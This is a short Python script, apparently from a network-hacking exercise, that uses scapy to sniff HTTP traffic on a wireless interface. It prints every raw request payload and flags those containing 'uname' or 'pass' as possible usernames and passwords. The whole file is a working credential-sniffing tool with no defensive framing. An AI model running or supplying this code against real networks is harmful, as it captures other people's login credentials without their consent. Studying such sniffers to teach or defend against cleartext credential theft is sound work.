# works on linux
import scapy.all as scapy
from scapy.layers.http import HTTPRequest, HTTPResponse


def sniff(interface):
    # store=0 is used to not store the packets in memory
    # prn is the callback function that will be called for each packet sniffed
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            print(load)
            words = ["uname", "pass"]
            for word in words:
                if word in load:
                    print("[+] Possible username/password found: " + load)
                    break
        

sniff("wlp1s0")
